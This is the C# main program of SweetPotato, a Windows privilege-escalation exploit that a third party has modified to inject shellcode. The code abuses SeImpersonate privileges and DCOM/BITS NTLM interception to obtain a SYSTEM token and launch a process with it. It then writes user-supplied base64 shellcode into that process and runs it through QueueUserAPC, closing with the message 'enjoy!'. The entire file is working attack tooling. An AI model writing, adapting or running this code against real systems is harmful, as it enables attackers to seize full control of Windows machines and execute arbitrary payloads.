using Microsoft.Win32;
using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {

        #region shellcode inject
        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("Kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        #endregion
        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        public static string HKLM_GetString(string path, string key) {
            try {
                RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
                if (rk == null) return "";
                return (string)rk.GetValue(key);
            } catch { return ""; }
        }

        //https://stackoverflow.com/questions/6331826/get-os-version-friendly-name-in-c-sharp
        public static string FriendlyName() {
            string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
            string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
            if (ProductName != "") {
                return (ProductName.StartsWith("Microsoft") ? "" : "Microsoft ") + ProductName +
                            (CSDVersion != "" ? " " + CSDVersion : "");
            }
            return "";
        }

        static bool IsBITSRequired() {

            if(Environment.OSVersion.Version.Major < 10) {
                return false;
            }

            string friendlyName = FriendlyName();

            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());

            if( (buildNumber <= 1809 && friendlyName.Contains("Windows 10")) ||
                buildNumber < 1809 && friendlyName.Contains("Windows Server")){
                return false;
            }

            return true;        
        }

        static void Main(string[] args) {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\werfault.exe";
            string shellcode = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            bool showHelp = false;
            bool isBITSRequired = false;

            Console.WriteLine(
                "Modifying SweetPotato by Uknow to support load shellcode \n" +
                "Github: https://github.com/uknowsec/SweetPotato \n" +
                "SweetPotato by @_EthicalChaos_\n" +
                 "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n"
                );

            OptionSet option_set = new OptionSet()
                .Add<string>("c=|clsid=", "CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Program to launch (default werfault.exe)", v => program = v)
                .Add("s=|shellcode=", "Arguments for program (default null)", v => shellcode = v)
                .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                if ( isBITSRequired = IsBITSRequired()) {
                    clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
                    Console.WriteLine("[=] Your version of Windows fixes DCOM interception forcing BITS to perform WinRM intercept");
                }

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cannot perform NTLM interception, neccessary priveleges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}", 
                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 :  port, executionMethod, program);

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, isBITSRequired);

                if (!potatoAPI.TriggerDCOM()) {
                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                    return;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";

                    Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if (executionMethod == ExecutionMethod.Token) {
                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    } else {
                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    byte[] b_shellcode = Convert.FromBase64String(shellcode);
                    uint lpNumberOfBytesWritten = 0;
                    IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pi.dwProcessId);
                    Console.WriteLine(String.Format(@"[+] OpenProcess Pid: {0}", pi.dwProcessId.ToString()));
                    IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)b_shellcode.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                    Console.WriteLine(@"[+] VirtualAllocEx Success");
                    if (WriteProcessMemory(pHandle, rMemAddress, b_shellcode, (uint)b_shellcode.Length, ref lpNumberOfBytesWritten))
                    {

                        IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)pi.dwThreadId);

                        IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);

                        ResumeThread(tHandle);
                        Console.WriteLine(String.Format(@"[+] QueueUserAPC Inject shellcode to PID: {0} Success", pi.dwProcessId.ToString()));
                    }
                    bool hOpenProcessClose = CloseHandle(pHandle);
                    if (hOpenProcessClose)
                    {
                        Console.WriteLine(@"[+] hOpenProcessClose Success");
                    }
                    Console.WriteLine("\n\n[*] QueueUserAPC Inject shellcode Success, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
